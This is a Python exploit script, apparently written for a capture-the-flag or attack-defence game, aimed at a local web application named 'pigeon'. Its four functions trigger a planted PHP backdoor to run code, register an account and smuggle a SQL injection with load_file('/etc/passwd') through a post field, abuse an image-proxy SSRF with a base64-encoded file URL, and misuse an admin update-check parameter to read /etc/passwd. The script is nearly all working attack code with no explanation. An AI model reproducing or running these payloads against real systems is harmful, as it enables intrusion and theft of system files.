import requests
import re

def zi_dai_hou_men():
	url = "http://127.0.0.1:8080/pigeon/function.php?1=phpinfo();"
	print(requests.get(url).text)

def sql_injection():
	s = requests.session()
	url = 'http://127.0.0.1:8080/?s=register'
	token = re.findall(r'var seid = \'(.+?)\'',s.get(url).text)[0]
	data = {
	"seid":token,
	"username":'1234',
	"email":'1234@123.com',
	"password":'1231234'
	}
	register = s.post(url,data)
	#print(register.text)
	login_url = 'http://127.0.0.1:8080/?s=login'
	data_login = {
	'seid':token,
	'username':'1234',
	'password':'1231234'
	}
	login = s.post(login_url,data_login)

	url_2 = "http://127.0.0.1:8080/?s=newpost&seid="+token
	data_2 = {
	'ispublic':"0',load_file('/etc/passwd'))#",
	"content":'123'
	}
	get_flag = s.post(url_2,data_2)
	flag = s.get("http://127.0.0.1:8080")
	print(flag.text)

def ssrf():
	url = 'http://127.0.0.1:8080/pigeon/imgproxy?url=ZmlsZTovLy9ldGMvcGFzc3dk'
	print(requests.get(url).text)

def wen_jian_du_qu():
	s = requests.session()
	url = 'http://127.0.0.1:8080/?s=register'
	token = re.findall(r'var seid = \'(.+?)\'',s.get(url).text)[0]
	data = {
	"seid":token,
	"username":'12345',
	"email":'12345@123.com',
	"password":'12312345'
	}
	register = s.post(url,data)
	#print(register.text)
	login_url = 'http://127.0.0.1:8080/?s=login'
	data_login = {
	'seid':token,
	'username':'12345',
	'password':'12312345'
	}
	login = s.post(login_url,data_login)
	get_flag_url = 'http://127.0.0.1:8080/admin.php?s=updatecheck&update_url=file:///etc/passwd&seid='+token
	print(s.get(get_flag_url,allow_redirects=False).text)

#zi_dai_hou_men()
#sql_injection()
#ssrf()
#wen_jian_du_qu()